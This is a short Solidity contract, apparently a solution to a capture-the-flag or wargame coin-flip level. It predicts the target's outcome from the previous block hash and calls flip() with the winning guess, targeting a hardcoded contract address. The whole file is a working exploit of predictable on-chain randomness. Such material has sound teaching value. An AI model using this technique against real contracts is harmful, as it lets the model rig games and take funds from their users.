// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.5.0 <0.9.0;


interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract exploit {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address addr = 0x172776D3a9630AB62ee53e85e545EB677654e724;

    function exploiting() public payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(addr).flip(side);
    }

}
